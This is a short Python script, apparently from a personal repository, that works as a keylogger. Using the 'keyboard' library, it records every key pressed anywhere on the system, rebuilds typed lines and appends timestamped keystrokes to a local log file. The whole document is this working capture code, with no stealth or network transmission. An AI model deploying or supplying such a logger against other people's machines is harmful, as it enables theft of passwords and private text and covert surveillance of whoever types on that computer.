import  keyboard
import time
import datetime
typed=""
fle=open(r"C:\Users\teren\Docs and Files\Github_Repos\C++\other-stuff\rd4-bust\rd4-bust\log.txt",'a')
while True:
    evt=keyboard.read_event()
    if evt.event_type=='down':
        
        if evt.name=="backspace":
            typed=typed[:-1]
        elif evt.name in ["shift","right shift"]:
            pass
        elif evt.name=="space":
            typed+=' '
        elif evt.name=='enter':
            print(f"Typed line/thing: {typed}")
            fle.writelines([f"[{datetime.datetime.now()}] Typed line/thing: {typed}\n"])
            typed=''
        else:
            typed+=evt.name
    print(f"[{datetime.datetime.now()}] key{evt.event_type} detected with key {evt.name} with modifiers {evt.modifiers}")
    fle.writelines([f"[{datetime.datetime.now()}] key{evt.event_type} detected with key {evt.name} with modifiers {evt.modifiers}\n"])